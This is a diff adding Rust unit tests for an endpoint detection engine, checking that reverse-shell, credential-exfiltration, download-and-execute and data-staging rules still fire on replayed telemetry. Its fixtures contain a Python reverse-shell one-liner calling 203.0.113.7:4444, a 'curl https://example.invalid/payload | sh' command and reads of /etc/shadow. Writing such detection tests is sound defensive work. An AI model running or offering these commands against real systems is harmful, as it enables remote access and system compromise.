@@ -1543,4 +1543,174 @@ rule eguard_custom_dir_test {
             assert!(crate::lifecycle::AgentRuntime::detection_rule_name(&outcome).is_some());
         }
     }
+    fn detp1_fixture_event(
+        pid: u32,
+        ppid: u32,
+        ts: i64,
+        class: EventClass,
+        process: &str,
+        parent: &str,
+    ) -> TelemetryEvent {
+        let mut event = base_event();
+        event.pid = pid;
+        event.ppid = ppid;
+        event.session_id = 1;
+        event.ts_unix = ts;
+        event.event_class = class;
+        event.process = process.into();
+        event.parent_process = parent.into();
+        event
+    }
+
+    fn detp1_replay_count(
+        engine: &mut detection::DetectionEngine,
+        events: &[TelemetryEvent],
+        rule: &str,
+    ) -> usize {
+        events
+            .iter()
+            .map(|event| {
+                let outcome = engine.process_event(event);
+                outcome
+                    .temporal_hits
+                    .iter()
+                    .chain(&outcome.kill_chain_hits)
+                    .filter(|hit| hit.as_str() == rule)
+                    .count()
+            })
+            .sum()
+    }
+
+    fn detp1_fixture_reverse(
+        process: &str,
+        pid: u32,
+        peer: &str,
+        port: u16,
+    ) -> Vec<TelemetryEvent> {
+        let shell = detp1_fixture_event(pid - 1, 1, 1, EventClass::ProcessExec, "sh", "service");
+        let mut exec = detp1_fixture_event(pid, pid - 1, 2, EventClass::ProcessExec, process, "sh");
+        exec.command_line = Some(format!("{process} health_check.py"));
+        let mut network = exec.clone();
+        network.ts_unix = 3;
+        network.event_class = EventClass::NetworkConnect;
+        network.dst_ip = Some(peer.into());
+        network.dst_port = Some(port);
+        let mut events = vec![shell, exec.clone(), network];
+        for i in 0..10 {
+            let mut read = exec.clone();
+            read.ts_unix = 4;
+            read.event_class = EventClass::FileOpen;
+            read.file_path = Some(format!("/usr/lib/{process}/module_{i}.py"));
+            events.push(read);
+        }
+        events
+    }
+
+    #[test]
+    fn detp1_phase0_replay_anonymized_groups_and_malicious_lookalikes() {
+        // Five historical group shapes, not reconstructed customer commands or event IDs.
+        // Group 3's missing downloader witnesses are covered separately by synthetic qualification.
+        for (process, instances) in [("python3.14", 2), ("python3", 1)] {
+            let mut engine = detp1_engine("198.51.100.20:50053");
+            let mut total = 0;
+            for i in 0..instances {
+                total += detp1_replay_count(
+                    &mut engine,
+                    &detp1_fixture_reverse(process, 1000 + i * 2, "198.51.100.20", 50053),
+                    "killchain_reverse_shell",
+                );
+            }
+            assert_eq!(
+                total, instances as usize,
+                "distinct interpreter groups retain one finding per instance"
+            );
+        }
+        // Group 4: an account lookup is not secret access.
+        let mut engine = detp1_engine("198.51.100.20:50053");
+        let mut read = detp1_fixture_event(2000, 1999, 1, EventClass::FileOpen, "cron", "cron");
+        read.file_path = Some("/etc/passwd".into());
+        let mut network = read.clone();
+        network.ts_unix = 2;
+        network.event_class = EventClass::NetworkConnect;
+        network.dst_ip = Some("198.51.100.20".into());
+        network.dst_port = Some(50053);
+        assert_eq!(
+            detp1_replay_count(
+                &mut engine,
+                &[read.clone(), network.clone()],
+                "phi_credential_exfil"
+            ),
+            0
+        );
+        // Group 5 remains reviewable; no blanket package-backup allowlist.
+        let mut engine = detp1_engine("198.51.100.20:50053");
+        engine
+            .load_sigma_rule_yaml(include_str!(
+                "../../../../rules/sigma/linux_data_staging_archive.yml"
+            ))
+            .unwrap();
+        let mut archive = detp1_fixture_event(
+            3000,
+            2999,
+            1,
+            EventClass::ProcessExec,
+            "tar",
+            "dpkg-db-backup",
+        );
+        archive.command_line = Some("tar -czf /var/backups/package-db.tgz /var/lib/dpkg".into());
+        assert_eq!(
+            detp1_replay_count(&mut engine, &[archive], "linux_data_staging_archive"),
+            1
+        );
+        // Real reverse-shell behavior survives both external and configured-server peers,
+        // including a non-control-plane peer using the product's usual port.
+        for (peer, port) in [
+            ("203.0.113.7", 4444),
+            ("203.0.113.7", 50053),
+            ("198.51.100.20", 50053),
+        ] {
+            let mut engine = detp1_engine("198.51.100.20:50053");
+            let mut events = detp1_fixture_reverse("python3", 4000, peer, port);
+            events[1].command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
+            assert_eq!(
+                detp1_replay_count(&mut engine, &events, "killchain_reverse_shell"),
+                1
+            );
+        }
+        let mut engine = detp1_engine("198.51.100.20:50053");
+        read.file_path = Some("/etc/shadow".into());
+        assert_eq!(
+            detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
+            1
+        );
+    }
+
+    #[test]
+    fn detp1_synthetic_qualification_guest_agent_download_exec_remains_enabled() {
+        // SYNTHETIC QUALIFICATION sequences, not recovered customer witnesses.
+        // The two historical guest-agent-context findings remain UNKNOWN.
+        // This must-keep-positive fixture intentionally also passes on the base.
+        for pid in [5000, 6000] {
+            let mut engine = detp1_engine("198.51.100.20:50053");
+            let mut downloader =
+                detp1_fixture_event(pid, 10, 1, EventClass::ProcessExec, "curl", "qemu-ga");
+            downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
+            let shell =
+                detp1_fixture_event(pid + 1, 10, 2, EventClass::ProcessExec, "sh", "qemu-ga");
+            assert_eq!(
+                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+                1
+            );
+        }
+        // Malicious curl|sh outside guest-agent context must also remain positive.
+        let mut engine = detp1_engine("198.51.100.20:50053");
+        let mut downloader =
+            detp1_fixture_event(7000, 10, 1, EventClass::ProcessExec, "curl", "service");
+        downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
+        let shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
+        assert_eq!(
+            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+            1
+        );
+    }
 }
